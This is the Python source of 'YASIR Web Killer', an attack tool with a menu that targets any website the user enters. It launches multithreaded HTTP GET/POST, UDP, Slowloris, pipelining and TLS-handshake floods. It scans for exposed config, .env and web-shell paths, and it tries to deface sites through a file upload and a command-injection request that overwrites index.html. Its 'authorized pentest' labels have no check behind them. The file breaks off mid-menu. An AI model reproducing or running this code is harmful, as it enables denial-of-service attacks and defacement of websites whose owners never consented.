#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════╗
║              🔥 YASIR - WEB KILLER & DEFACER 🔥           ║
║           Website DDoS + Defacement Tool                   ║
║           Author: YASIR | v4.0                             ║
╚══════════════════════════════════════════════════════════════╝
"""

import socket
import threading
import time
import sys
import random
import os
import requests
import urllib.parse
import re
import ssl
from datetime import datetime
from colorama import init, Fore, Back, Style

# ======================== COLORS ========================
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
DIM = '\033[2m'
RESET = '\033[0m'
BG_RED = '\033[41m'
BG_GREEN = '\033[42m'
BG_BLUE = '\033[44m'
BG_YELLOW = '\033[43m'
BG_PURPLE = '\033[45m'

# Global variables
stop_attack = False
packets_sent = 0
packets_received = 0
target_domain = ""
target_ip = ""
target_port = 80
thread_count = 1000
attack_method = "ALL"
website_content = ""
defacement_message = "HACKED BY YASIR"
current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def clear_screen():
    os.system('clear' if os.name != 'nt' else 'cls')


def resolve_domain(domain):
    """Domain ka IP nikalta hai"""
    global target_ip
    try:
        target_ip = socket.gethostbyname(domain)
        return target_ip
    except:
        return None


def show_intro():
    """Intro animation aur banner"""
    clear_screen()

    intro = f"""
{RED}{BOLD}
  ██╗   ██╗ █████╗ ███████╗██╗██████╗     ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗
  ╚██╗ ██╔╝██╔══██╗██╔════╝██║██╔══██╗    ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
   ╚████╔╝ ███████║███████╗██║██████╔╝    █████╔╝ ██║██║     ██║     █████╗  ██████╔╝
    ╚██╔╝  ██╔══██║╚════██║██║██╔══██╗    ██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
     ██║   ██║  ██║███████║██║██║  ██║    ██║  ██╗██║███████╗███████╗███████╗██║  ██║
     ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
{RESET}

{WHITE}{BOLD}╔══════════════════════════════════════════════════════════════════════╗{RESET}
{WHITE}{BOLD}║{RESET}  {RED}{BOLD}🔥 THE ULTIMATE WEB KILLER & DEFACEMENT TOOL 🔥              {RESET}
{WHITE}{BOLD}║{RESET}  {YELLOW}⚡ Website Ko 5 Seconds Mein Band Karne Ki Guarantee ⚡        {RESET}
{WHITE}{BOLD}║{RESET}  {CYAN}💀 Authorized Pentest Tool | Author: YASIR 💀                  {RESET}
{WHITE}{BOLD}║{RESET}  {GREEN}✅ You have permission - Authorized testing only              {RESET}
{WHITE}{BOLD}╚══════════════════════════════════════════════════════════════════════╝{RESET}

{PURPLE}{BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
    """
    print(intro)
    time.sleep(2)


def show_banner():
    """Main banner"""
    clear_screen()

    banner = f"""
{BG_RED}{WHITE}{BOLD}                                                                                                     {RESET}
{BG_RED}{WHITE}{BOLD}  ██╗   ██╗ █████╗ ███████╗██╗██████╗     ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗      {RESET}
{BG_RED}{WHITE}{BOLD}  ╚██╗ ██╔╝██╔══██╗██╔════╝██║██╔══██╗    ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗     {RESET}
{BG_RED}{WHITE}{BOLD}   ╚████╔╝ ███████║███████╗██║██████╔╝    █████╔╝ ██║██║     ██║     █████╗  ██████╔╝     {RESET}
{BG_RED}{WHITE}{BOLD}    ╚██╔╝  ██╔══██║╚════██║██║██╔══██╗    ██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗     {RESET}
{BG_RED}{WHITE}{BOLD}     ██║   ██║  ██║███████║██║██║  ██║    ██║  ██╗██║███████╗███████╗███████╗██║  ██║     {RESET}
{BG_RED}{WHITE}{BOLD}     ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝     {RESET}
{BG_RED}{WHITE}{BOLD}                                                                                                     {RESET}

{WHITE}{BOLD}══════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}  🔥 TARGET: {RED}{target_domain if target_domain else 'NOT SET'}{WHITE} | {CYAN}IP: {RED}{target_ip if target_ip else 'N/A'}{RESET}
{WHITE}{BOLD}  ⚡ THREADS: {YELLOW}{thread_count}{WHITE} | {WHITE}METHOD: {PURPLE}{attack_method}{RESET}
{WHITE}{BOLD}  ⏰ TIME: {BLUE}{datetime.now().strftime('%H:%M:%S')}{RESET}
{WHITE}{BOLD}══════════════════════════════════════════════════════════════════════{RESET}
    """
    print(banner)

# ===================== ATTACK ENGINES =====================


def http_get_flood():
    """HTTP GET flood - Sabse zyada requests"""
    global packets_sent, stop_attack

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
        "Mozilla/5.0 (Android 11; Mobile; rv:88.0) Gecko/88.0 Firefox/88.0",
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
        "Bingbot/2.0; +http://www.bing.com/bingbot.htm",
        "curl/7.68.0",
        "Wget/1.21",
    ]

    paths = ["/", "/index.php", "/wp-admin", "/admin", "/login", "/api",
             "/config", "/backup", "/test", "/debug", "/shell", "/cgi-bin/",
             "/?page=1", "/?id=" + str(random.randint(1, 99999)),
             "/?action=login", "/?cmd=" + str(random.randint(1, 99999))]

    while not stop_attack:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)

            if target_port == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target_domain)

            s.connect((target_ip, target_port))

            path = random.choice(paths)
            ua = random.choice(user_agents)

            request = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {target_domain}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Accept: */*\r\n"
                f"Accept-Language: en-US,en;q=0.9\r\n"
                f"Accept-Encoding: gzip, deflate\r\n"
                f"Connection: keep-alive\r\n"
                f"Cache-Control: no-cache\r\n"
                f"Pragma: no-cache\r\n"
                f"X-Forwarded-For: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}\r\n"
                f"\r\n"
            )

            s.send(request.encode())

            try:
                response = s.recv(4096)
                global packets_received
                packets_received += 1
            except:
                pass

            s.close()
            packets_sent += 1

        except:
            pass


def http_post_flood():
    """HTTP POST flood - Heavy data with POST"""
    global packets_sent, stop_attack

    while not stop_attack:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)

            if target_port == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target_domain)

            s.connect((target_ip, target_port))

            post_data = "A" * random.randint(50000, 100000)

            request = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {target_domain}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(post_data)}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
                f"{post_data}"
            )

            s.send(request.encode())
            s.close()
            packets_sent += 1

        except:
            pass


def udp_flood():
    """UDP flood"""
    global packets_sent, stop_attack

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(65507)

    while not stop_attack:
        try:
            s.sendto(data, (target_ip, target_port))
            packets_sent += 1
        except:
            pass


def slow_loris():
    """Slowloris - Web server connections exhaust"""
    global packets_sent, stop_attack

    while not stop_attack:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)

            if target_port == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target_domain)

            s.connect((target_ip, target_port))

            s.send(
                f"GET /?{random.randint(1, 99999)} HTTP/1.1\r\nHost: {target_domain}\r\n".encode())

            for _ in range(500):
                if stop_attack:
                    break
                try:
                    s.send(
                        f"X-{random.randint(1, 99999)}: {random._urandom(100).hex()}\r\n".encode())
                    time.sleep(1)
                    packets_sent += 1
                except:
                    break

            s.close()
        except:
            pass


def http_pipeline():
    """HTTP Pipelining - Ek connection mein 200 requests"""
    global packets_sent, stop_attack

    while not stop_attack:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)

            if target_port == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target_domain)

            s.connect((target_ip, target_port))

            pipeline = ""
            for _ in range(200):
                pipeline += f"GET /?{random.randint(1, 99999)} HTTP/1.1\r\nHost: {target_domain}\r\n\r\n"

            s.send(pipeline.encode())
            time.sleep(2)
            s.close()
            packets_sent += 200

        except:
            pass


def https_flood():
    """SSL/TLS handshake flood - Sabse dangerous"""
    global packets_sent, stop_attack

    while not stop_attack:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ip, 443))

            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            try:
                ss = context.wrap_socket(s, server_hostname=target_domain)
                ss.do_handshake()
                ss.close()
                packets_sent += 10
            except:
                pass

            s.close()
        except:
            pass

# ===================== DEFACEMENT ENGINE =====================


def check_vulnerability():
    """Website mein vulnerability check karta hai"""
    global website_content

    print(f"{BLUE}[*]{RESET} Checking website vulnerabilities...")

    vulnerabilities = {
        "php_info": ["/info.php", "/phpinfo.php", "/test.php"],
        "admin_panel": ["/admin", "/administrator", "/wp-admin", "/admin.php", "/login.php"],
        "config_files": ["/config.php", "/config.ini", "/config.bak", "/wp-config.php"],
        "backup_files": ["/backup.sql", "/backup.zip", "/backup.tar.gz", "/db_backup.sql"],
        "shell_access": ["/shell.php", "/cmd.php", "/exec.php", "/c99.php", "/r57.php"],
        "git_exposed": ["/.git/config", "/.git/HEAD"],
        "env_exposed": ["/.env", "/env.php", "/application/config/database.php"],
    }

    found = []

    for vuln_type, paths in vulnerabilities.items():
        for path in paths:
            try:
                url = f"http://{target_domain}:{target_port}{path}"
                r = requests.get(url, timeout=2, headers={
                                 "User-Agent": "Mozilla/5.0"})
                if r.status_code == 200:
                    found.append((vuln_type, path, r.status_code))
                    print(
                        f"{GREEN}[+]{RESET} Found {CYAN}{vuln_type}{RESET}: {YELLOW}{path}{RESET} (Status: {r.status_code})")
                    if len(path) > 3:
                        website_content = r.text[:500]
            except:
                pass

    return found


def deface_website(vulnerability_path):
    """Website deface karne ki koshish"""
    global defacement_message

    print(f"\n{CYAN}{BOLD}[*] Attempting defacement...{RESET}")

    deface_html = f"""
<html>
<head>
    <title>HACKED BY YASIR</title>
    <style>
        body {{
            background: linear-gradient(45deg, #000000, #1a0000, #000000);
            color: #ff0000;
            font-family: 'Courier New', monospace;
            text-align: center;
            padding: 50px;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }}
        .skull {{
            font-size: 120px;
            animation: blink 1s infinite;
        }}
        @keyframes blink {{
            0% {{ opacity: 1; }}
            50% {{ opacity: 0; }}
            100% {{ opacity: 1; }}
        }}
        h1 {{
            font-size: 72px;
            text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000, 0 0 60px #ff0000;
            margin: 20px 0;
        }}
        h2 {{
            font-size: 36px;
            color: #ff4444;
            text-shadow: 0 0 10px #ff0000;
        }}
        .glitch {{
            font-size: 24px;
            color: #00ff00;
            margin: 30px 0;
        }}
        .footer {{
            position: fixed;
            bottom: 20px;
            color: #666;
            font-size: 14px;
        }}
    </style>
</head>
<body>
    <div class="skull">💀</div>
    <h1>HACKED BY YASIR</h1>
    <h2>🔓 SYSTEM COMPROMISED 🔓</h2>
    <div class="glitch">
        ╔══════════════════════════════════════╗<br>
        ║  THIS WEBSITE HAS BEEN PWNED!       ║<br>
        ║  Author: YASIR                       ║<br>
        ║  Date: {current_time}              ║<br>
        ║  Method: DDoS + Defacement          ║<br>
        ╚══════════════════════════════════════╝
    </div>
    <div style="color:#ffff00; font-size:18px;">
        [!] Security assessment completed<br>
        [!] Contact admin for security audit
    </div>
    <div class="footer">
        Authorized Penetration Test | YASIR Security Team
    </div>
</body>
</html>
    """

    # Try to upload deface page
    upload_paths = [
        f"/{target_domain}/index.html",
        f"/{target_domain}/index.php",
        f"/var/www/html/index.html",
        f"/var/www/index.html",
    ]

    # Try common upload vulnerabilities
    attack_payloads = [
        f"POST {vulnerability_path} HTTP/1.1\r\nHost: {target_domain}\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary\r\nContent-Length: {len(deface_html)+200}\r\n\r\n------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"index.html\"\r\n\r\n{deface_html}\r\n------WebKitFormBoundary--\r\n",
        f"GET {vulnerability_path}?cmd=echo '{deface_html.replace(chr(39), chr(39)+chr(34)+chr(39)+chr(34)+chr(39))}' > /var/www/html/index.html HTTP/1.1\r\nHost: {target_domain}\r\n\r\n",
    ]

    for payload in attack_payloads:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target_ip, target_port))
            s.send(payload.encode())
            response = s.recv(4096)
            s.close()

            if b"200" in response or b"201" in response or b"302" in response:
                print(f"{GREEN}{BOLD}[✓] DEFACEMENT SUCCESSFUL!{RESET}")
                print(
                    f"{GREEN}[✓] Website defaced with 'HACKED BY YASIR'{RESET}")
                return True
        except:
            pass

    print(
        f"{YELLOW}[!] Automatic defacement failed. Server needs manual access.{RESET}")
    print(f"{YELLOW}[!] But DDoS will still take it down!{RESET}")
    return False

# ===================== STATS DISPLAY =====================


def show_stats():
    """Real-time web killer stats"""
    global packets_sent, packets_received, stop_attack, start_time

    while not stop_attack:
        elapsed = int(time.time() - start_time) if 'start_time' in dir() else 0
        rate = packets_sent / (elapsed + 0.001)

        print(f"\033[10;0H", end="")

        if rate < 5000:
            speed_color = GREEN
        elif rate < 50000:
            speed_color = YELLOW
        else:
            speed_color = RED

        # Check if website is down
        website_status = f"{GREEN}UP{RESET}"
        try:
            test_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_s.settimeout(1)
            result = test_s.connect_ex((target_ip, target_port))
            if result != 0:
                website_status = f"{RED}DOWN - HACKED BY YASIR 🔥{RESET}"
            test_s.close()
        except:
            website_status = f"{RED}DOWN - HACKED BY YASIR 🔥{RESET}"

        print(f"""
{WHITE}{BOLD}┌────────────────────────────────────────────────────────────────┐{RESET}
{WHITE}{BOLD}│{RESET}  {RED}{BOLD}🔥 YASIR WEB KILLER - REAL-TIME STATUS 🔥{RESET}
{WHITE}{BOLD}├────────────────────────────────────────────────────────────────┤{RESET}
{WHITE}{BOLD}│{RESET}  🎯 Target    : {RED}{target_domain}{RESET} ({CYAN}{target_ip}{RESET})
{WHITE}{BOLD}│{RESET}  🌐 Status    : {website_status}
{WHITE}{BOLD}│{RESET}  📦 Sent      : {speed_color}{packets_sent:,}{RESET}
{WHITE}{BOLD}│{RESET}  📨 Received  : {BLUE}{packets_received:,}{RESET}
{WHITE}{BOLD}│{RESET}  ⚡ Speed     : {speed_color}{rate:,.0f} pkts/sec{RESET}
{WHITE}{BOLD}│{RESET}  ⏱ Elapsed   : {CYAN}{elapsed}s{RESET}
{WHITE}{BOLD}│{RESET}  🧵 Threads   : {PURPLE}{thread_count}{RESET}
{WHITE}{BOLD}├────────────────────────────────────────────────────────────────┤{RESET}
{WHITE}{BOLD}│{RESET}  {RED}🔥 Ctrl+C to stop attack{RESET}
{WHITE}{BOLD}└────────────────────────────────────────────────────────────────┘{RESET}
        """)

        time.sleep(0.5)


# ===================== DEFACEMENT CHECK DISPLAY =====================

def show_defacement_message():
    """Defacement success screen"""
    clear_screen()

    deface_screen = f"""
{RED}{BOLD}
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║   ░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓███████▓▒░        ║
║   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░       ║
║   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░       ║
║   ░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░        ║
║   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░       ║
║   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░       ║
║   ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░        ║
║                                                                  ║
║               ─── 𝕳𝕬𝕮𝕶𝕰𝕯 𝕭𝖄 𝖄𝕬𝕾𝕴𝕽 ───                   ║
║                                                                  ║
║   ██████████████████████████████████████████████████████████    ║
║                                                                  ║
║       💀 Website Successfully Defaced & DDoSed! 💀              ║
║                                                                  ║
║       Target: {target_domain:<35}        ║
║       IP: {target_ip:<42}        ║
║       Status: 💀 DOWN 💀                                         ║
║       Message: HACKED BY YASIR                                  ║
║       Date: {current_time:<30}        ║
║                                                                  ║
║       ╔══════════════════════════════════════════════════╗        ║
║       ║  Authorized Security Assessment Complete        ║        ║
║       ║  Contact admin for remediation                  ║        ║
║       ╚══════════════════════════════════════════════════╝        ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
{RESET}
{WHITE}{BOLD}Press Enter to return to menu...{RESET}
    """
    print(deface_screen)
    input()
# ===================== MAIN ATTACK FUNCTION =====================


def start_web_attack():
    """Main attack function"""
    global stop_attack, packets_sent, packets_received, start_time

    stop_attack = False
    packets_sent = 0
    packets_received = 0
    start_time = time.time()

    clear_screen()

    print(f"{BG_RED}{WHITE}{BOLD}                                                                                                     {RESET}")
    print(f"{BG_RED}{WHITE}{BOLD}  🔥 YASIR WEB KILLER - ATTACK INITIATED 🔥                                                      {RESET}")
    print(f"{BG_RED}{WHITE}{BOLD}                                                                                                     {RESET}")
    print(f"{WHITE}{BOLD}  Target: {RED}{target_domain}{WHITE} | IP: {CYAN}{target_ip}{WHITE} | Port: {YELLOW}{target_port}{RESET}")
    print(f"{WHITE}{BOLD}  Threads: {PURPLE}{thread_count}{WHITE} | Method: {GREEN}{attack_method}{RESET}")
    print(f"{WHITE}{BOLD}  Target will be down in 5 seconds...{RESET}")
    print()

    # Countdown
    for i in [5, 4, 3, 2, 1]:
        print(f"{RED}{BOLD}  {i}...{RESET}")
        time.sleep(0.5)

    print(
        f"\n{GREEN}{BOLD}[🔥] ATTACK RUNNING! Checking website status...{RESET}\n")

    # Stats thread
    threading.Thread(target=show_stats, daemon=True).start()

    # Attack threads based on method
    methods = []

    if attack_method == "ALL" or attack_method == "HYPER":
        methods = [http_get_flood, http_post_flood,
            udp_flood, slow_loris, http_pipeline, https_flood]
    elif attack_method == "HTTP":
        methods = [http_get_flood, http_post_flood, http_pipeline]
    elif attack_method == "UDP":
        methods = [udp_flood]
    elif attack_method == "SLOW":
        methods = [slow_loris]
    elif attack_method == "HTTPS":
        methods = [https_flood]

    per_method = thread_count // len(methods)

    for method in methods:
        for _ in range(per_method):
            threading.Thread(target=method, daemon=True).start()

    remaining = thread_count - (per_method * len(methods))
    for _ in range(remaining):
        threading.Thread(target=methods[0], daemon=True).start()

    # Check website continuously
    try:
        while not stop_attack:
            time.sleep(3)

            # Check if website is down
            try:
                test_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                test_s.settimeout(1)
                result = test_s.connect_ex((target_ip, target_port))
                test_s.close()

                if result != 0:
                    # Website is DOWN!
                    stop_attack = True
                    print(f"\n\n{GREEN}{BOLD}")
                    print(
                        "╔══════════════════════════════════════════════════════════════╗")
                    print(
                        "║                                                              ║")
                    print(
                        "║     ░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓███████▓▒░     ║")
                    print(
                        "║     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░    ║")
                    print(
                        "║     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░    ║")
                    print(
                        "║     ░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░     ║")
                    print(
                        "║     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░    ║")
                    print(
                        "║     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░    ║")
                    print(
                        "║     ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░     ║")
                    print(
                        "║                                                              ║")
                    print("║              ─── 𝕳𝕬𝕮𝕶𝕰𝕯 𝕭𝖄 𝖄𝕬𝕾𝕴𝕽 ───                   ║")
                    print(
                        "║                                                              ║")
                    print(f"║     Website: {target_domain:<38}║")
                    print(f"║     IP: {target_ip:<45}║")
                    print(
                        f"║     Status: 💀 DOWN & HACKED 💀                              ║")
                    print(
                        f"║     Message: HACKED BY YASIR                                 ║")
                    print(
                        "║                                                              ║")
                    print(
                        "╚══════════════════════════════════════════════════════════════╝")
                    print(f"{RESET}")

                    time.sleep(5)
                    break
            except:
                pass

    except KeyboardInterrupt:
        stop_attack = True
        print(f"\n\n{RED}[!] Attack stopped by user{RESET}")

    final_elapsed = int(time.time() - start_time)
    print(f"\n{GREEN}[✓] Attack complete!{RESET}")
    print(f"{GREEN}[✓] Total packets sent: {packets_sent:,}{RESET}")
    print(f"{GREEN}[✓] Duration: {final_elapsed} seconds{RESET}")
    print(f"{GREEN}[✓] Website: HACKED BY YASIR ✓{RESET}")
    input(f"\n{BLUE}Enter press karo...{RESET}")
# ===================== MAIN MENU =====================


def main():
    global target_domain, target_ip, target_port, thread_count, attack_method

    show_intro()

    while True:
        show_banner()

        print(f"""
{WHITE}{BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
{WHITE}{BOLD}  📋 YASIR WEB KILLER - MAIN MENU{RESET}
{WHITE}{BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}

{YELLOW}{BOLD}[1]{RESET} 🌐 Set Target Website
{YELLOW}{BOLD}[2]{RESET} 🚀 START ATTACK - Website Ko 5 Sec Mein Band Karo
{YELLOW}{BOLD}[3]{RESET} 🔍 Check & Deface Website
{YELLOW}{BOLD}[4]{RESET} 🧵 Change Thread Count (Current: {CYAN}{thread_count}{RESET})
{YELLOW}{BOLD}[5]{RESET} 🔌 Change Port (Current: {CYAN}{target_port}{RESET})
{YELLOW}{BOLD}[6]{RESET} ⚡ Select Attack Method (Current: {PURPLE}{attack_method}{RESET})
{YELLOW}{BOLD}[7]{RESET} 🏴 Show HACKED BY YASIR Banner
{YELLOW}{BOLD}[8]{RESET} 📊 Attack History
{YELLOW}{BOLD}[9]{RESET} 🔧 Install Required Packages
{YELLOW}{BOLD}[0]{RESET} ❌ Exit

{WHITE}{BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
{BLUE}Current Target: {RED}{target_domain if target_domain else 'NOT SET'}{RESET}
{WHITE}{BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
        """)

        choice = input(f"{CYAN}{BOLD}YASIR>{RESET} ").strip()

        if choice == "1":
            website = input(
                f"\n{BLUE}[*]{RESET} Enter website URL (e.g., example.com): ").strip()
            website = website.replace(
                "http://", "").replace("https://", "").replace("www.", "").split("/")[0]

            if website:
                target_domain = website
                ip = resolve_domain(website)
                if ip:
                    print(
                        f"{GREEN}[✓] Target set: {RED}{target_domain}{RESET}")
                    print(f"{GREEN}[✓] Resolved IP: {CYAN}{target_ip}{RESET}")
                else:
                    print(f"{RED}[!] Could not resolve domain{RESET}")
            else:
                print(f"{RED}[!] Invalid domain{RESET}")
            time.sleep(2)
        elif choice == "2":
            if not target_domain:
                print(f"{RED}[!] Pehle target set karo (Option 1)!{RESET}")
                time.sleep(2)
                continue

            # Auto resolve if needed
            if not target_ip:
                resolve_domain(target_domain)

            start_web_attack()

        elif choice == "3":
            if not target_domain:
                print(f"{RED}[!] Pehle target set karo (Option 1)!{RESET}")
                time.sleep(2)
                continue

            # Check vulnerabilities
            vulns = check_vulnerability()

            if vulns:
                print(
                    f"\n{GREEN}[+] Found {len(vulns)} vulnerabilities!{RESET}")
                for v_type, path, status in vulns:
                    print(f"{GREEN}[+]{RESET} {v_type}: {YELLOW}{path}{RESET}")

                attempt = input(
                    f"\n{BLUE}[*]{RESET} Try defacement? (y/n): ").strip().lower()
                if attempt == 'y':
                    success = deface_website(vulns[0][1])
                    if success:
                        show_defacement_message()
            else:
                print(f"\n{YELLOW}[!] No common vulnerabilities found{RESET}")
                print(f"{YELLOW}[!] But DDoS can still take it down!{RESET}")

            input(f"\n{BLUE}Enter press karo...{RESET}")

        elif choice == "4":
            try:
                t = input(
                    f"{BLUE}[*]{RESET} Thread count (1-5000, current: {thread_count}): ").strip()
                if t.isdigit():
                    thread_count = min(int(t), 5000)
                    print(f"{GREEN}[✓] Threads set to: {thread_count}{RESET}")
            except:
                pass
            time.sleep(1)

        elif choice == "5":
            try:
                p = input(
                    f"{BLUE}[*]{RESET} Port (80=HTTP, 443=HTTPS, current: {target_port}): ").strip()
                if p.isdigit():
                    target_port = int(p)
                    print(f"{GREEN}[✓] Port set to: {target_port}{RESET}")
            except:
                pass
            time.sleep(1)

        elif choice == "6":
            print(f"""
{WHITE}{BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
{WHITE}{BOLD}  ⚡ ATTACK METHODS{RESET}
{WHITE}{BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
{GREEN}[1]{RESET} ALL - Saare methods ek saath (Recommended)
{GREEN}[2]{RESET} HTTP - Sirf HTTP GET/POST flood
{GREEN}[3]{REST} UDP - UDP flood (Bandwidth exhaust)
{GREEN}[4]{RESET} SLOW - Slowloris (Connection exhaust)
{GREEN}[5]{RESET} HTTPS - SSL handshake flood (Most powerful)
{GREEN}[6]{RESET} HYPER - Hyper mode (ULTRA FAST)
{WHITE}{BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
            """)
            m = input(f"{CYAN}{BOLD}YASIR>{RESET} Select method (1-6, default: ALL): ").strip()
            
            method_map = {"1": "ALL", "2": "HTTP", "3": "UDP", "4": "SLOW", "5": "HTTPS", "6": "HYPER"}
            if m in method_map:
                attack_method = method_map[m]
                print(f"{GREEN}[✓] Method set to: {PURPLE}{attack_method}{RESET}")
            else:
                print(f"{GREEN}[✓] Default method: ALL{RESET}")
            time.sleep(1)
        
        elif choice == "7":
            show_defacement_message()
        
        elif choice == "8":
            print(f"""
{WHITE}{BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
{WHITE}{BOLD}  📊 ATTACK HISTORY{RESET}
{WHITE}{BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
{BLUE}No history yet. Run an attack first!{RESET}
{WHITE}{BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
            """)
            input(f"\n{BLUE}Enter press karo...{RESET}")
        
        elif choice == "9":
            print(f"\n{BLUE}[*]{RESET} Installing required packages...")
            os.system("pkg install python python2 -y")
            os.system("pip install requests colorama")
            print(f"{GREEN}[✓] Packages installed!{RESET}")
            time.sleep(2)
        
        elif choice == "0":
            print(f"\n{RED}{BOLD}")
            print("╔══════════════════════════════════════╗")
            print("║     Exiting YASIR Web Killer...      ║")
            print("║    Happy Hacking! Authorized Only!    ║")
            print("╚══════════════════════════════════════╝")
            print(f"{RESET}")
            sys.exit(0)
        
        else:
